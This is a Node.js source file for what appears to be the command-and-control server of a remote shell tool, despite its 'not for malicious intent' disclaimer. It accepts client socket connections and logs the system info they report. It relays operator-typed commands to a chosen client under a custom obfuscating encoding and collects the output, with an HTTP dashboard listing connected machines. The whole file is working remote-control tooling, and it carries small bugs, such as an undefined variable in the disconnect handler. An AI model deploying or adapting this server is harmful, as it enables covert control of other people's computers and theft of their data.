/*

    File name: server.js
    Author: MathIsSimple
    Using: Nodejs
    Type: Build
    Build Version: 0.8
    Disclaimer: I created this project to learn about custom encoding and python sockets,
                this projected isn't made to be used for maliscious intent. Do so at your own risk

*/

const readline = require('readline');
const http     = require('http');
const net      = require('net');
const fs       = require('fs');

const characters    = "\"\\?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'!&+*|`^@[]=#~-_<>(){}§$%µ£¤ç ";
const bits_per_char = bin(characters.length).length;

const LOGS     = "./logs/";
const sockPort = 64500;
const httpPort = 80;

let clients = [];
let current_socket_index = null;

/*
    PRELOADING
*/

if (fs.existsSync(LOGS) == false) {
    fs.mkdirSync(LOGS);
}

/* CREATING SERVERS */

let sockServer = net.createServer();
let sockServerActive = false;
let httpServer = http.createServer();
let httpServerActive = false;

/* LISTENING */

httpServer.listen(httpPort, (err) => {
    if (err) {
        throw err;
    }
    console.log('Port %s successfully opened for the http server, awaiting requests...', httpPort);
    httpServerActive = true;
});

sockServer.listen(sockPort, (err) => {
    if (err) {
        throw err;
    }
    console.log('Port %s successfully opened for the socket server, awaiting connections...', sockPort);
    sockServerActive = true;
});

/* Connection Handling */

httpServer.on('request', (request, response) => {
    let url         = request.url;
    let contentType = "";

    const method    = request.method;

    if (url == "/") {
        url = "./index.html"; 
        contentType = "text/html";
    } else {
        url = "." + url;
        if (url != "./socket_info") {
            if (url.includes(".css")) {
                contentType = "text/css";
            } else if (url.includes(".js")) {
                contentType = "text/javascript";
            }
        } else {
           contentType = "application/json"; 
        }
    }
    if (fs.existsSync(url)) {
        fs.readFile(url, (err, data) => {
            if (err) {
                throw err;
            } else {
                response.writeHead(200, {'Content-Type': contentType});

                data = data.toString();

                if (url == "./index.html") {
                    data = data.replace("#sss", sockServerActive);
                    data = data.replace("#sws", httpServerActive);

                    data = data.replace("#pss", sockPort);
                    data = data.replace("#pws", httpPort);

                    data = data.replace("#nc", clients.length);
                }

                response.end(data);
            }
        });
    } else {
        if (url == "./socket_info") {
            let res = {
                info: []
            };

            for (let client of clients) {
                res.info.push(client.variables.info);
            }

            response.writeHead(200, {'Content-Type': contentType});
            response.end(JSON.stringify(res))
        } else {
            response.writeHead(404, {'Content-Type': 'text/plain'});
            response.end("404 File Not Found");
        }
    }
});

sockServer.on('connection', function(socket) {
    const socket_index = clients.length;

    clients.push(
        {
            socket: socket,
            variables: {
                info: [],
                commands: [],
                responses: [],
                address: socket.remoteAddress,
                port: socket.remotePort,
                status: {
                    receivingInfo: true,
                    sendingComands: {
                        sendingComands: false,
                        waitingForResponse: false
                    }
                }
            }
        }
    );

    if (current_socket_index == null) current_socket_index = socket_index;

    socket.on('data', function(data) {
        data = data.toString()

        decrypt(data, (decrypted) => {
            decrypted = decrypted.toString("utf-8");

            if (decrypted != "END") {
                if (current_socket_index == socket_index) {
                    console.log("   " + decrypted);
                }
                if (clients[socket_index].variables.status.receivingInfo == true) {
                    clients[socket_index].variables.info.push(decrypted);
                } else {
                    clients[socket_index].variables.responses[clients[socket_index].variables.responses.length - 1].push(decrypted);
                }
            } else {
                if (clients[socket_index].variables.status.receivingInfo == true) {
                    clients[socket_index].variables.status.receivingInfo = false;
                    clients[socket_index].variables.status.sendingComands.sendingComands = true;
                    clients[socket_index].variables.status.sendingComands.waitingForResponse = false;
                } 
                if (clients[socket_index].variables.status.sendingComands.sendingComands == true) {
                    if (clients[socket_index].variables.status.sendingComands.waitingForResponse == true) {
                        clients[socket_index].variables.status.sendingComands.waitingForResponse = false;
                    }
                    if (clients[socket_index].variables.status.sendingComands.waitingForResponse == false){
                        if (current_socket_index == socket_index) {
                            askCommand(socket_index);
                        }
                    }
                }
            }
        });
    });

    socket.on('end', () => {
        console.log('%s disconnected', clientAddress);
        sockets.slice(socket_index, 1)
    });
});

function askCommand(socket_index) {
    ask('Command to execute : ', (command) => {
        switch(command) {
            case "WRITE_LOG":
                const time = new Date();
                const filename = "log" + time.getHours() + "_" + time.getMinutes() + "_" + time.getSeconds() + ".json";
                const file = LOGS + filename;
                const data = JSON.stringify(clients[socket_index].variables);

                fs.writeFile(file, data, (err) => {
                    if (err != null) {
                        throw err;
                    }
                });
                askCommand(socket_index);
                break;
            case "CLIENTS":
                console.log("");
                let index = 0;
                for (client of clients) {
                    console.log(index + " : " + client.variables.address);
                    index ++;
                }
                console.log("");
                askCommand(socket_index);
                break;
            case "CHANGE_CLIENT":
                ask('Wich one do you want : ', (new_socket_index) => {
                    new_socket_index = Math.floor(new_socket_index);
                    current_socket_index = new_socket_index;
                    askCommand(new_socket_index);
                });
                break;
            case "CLIENT_INFO":
                console.log("");
                console.log("Printing info of current client ("+socket_index+")");
                for (item of clients[socket_index].variables.info) {
                    console.log(item);
                }
                console.log("");
                askCommand(socket_index);
                break;
            case "END":
                process.exit(0);
                break;
            default:
                encrypt(command, function(response) {
                    clients[socket_index].variables.commands.push(command);
                    clients[socket_index].variables.responses.push([]);
                    clients[socket_index].socket.write(response);
                    clients[socket_index].variables.status.sendingComands.waitingForResponse = true;
                });
                break;
        }
    });
}

function ask(question, callback) {
    let rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(question, (command) => {
        rl.close();
        callback(command);
    });
}

/* ENCRYPTION / DECRYPTION */

function bin(nuber) {
    return (nuber >>> 0).toString(2)
}

function unbin(number) {
    return parseInt(number, 2);
}

function modify(message) {
    output = "";

    for (character of message) {
        index  =  characters.indexOf(character);
        index2 =  characters.length - 1 - index;
        letter =  characters[index2];
        output += letter;
    }

    return output;
}

function longify(message) {
    output = "";

    for (character of message) {
        bin_number = bin(characters.indexOf(character));
        let diff = bits_per_char - bin_number.length;
        for (let i = 0; i < diff; i ++) {
            bin_number = "0" + bin_number;
        }
        output += bin_number;
    }

    return output;
}

function delongify(message) {
    output = "";

    for (let i = 0; i < Math.floor(message.length / bits_per_char); i ++) {
        character = "";
        for (let j = i * bits_per_char; j < i * bits_per_char + bits_per_char; j ++) {
            character += message[j];
        }
        character = unbin(character)
        output   += characters[character];
    }

    return output;
}

function reverse(message) {
    return message.split("").reverse().join("");
}

function encrypt(message, callback) {
    output = modify(message);
    output = reverse(output);
    output = longify(output);
    callback(output);
}

function decrypt(message, callback) {
    output = delongify(message);
    output = reverse(output);
    output = modify(output);
    callback(output);
}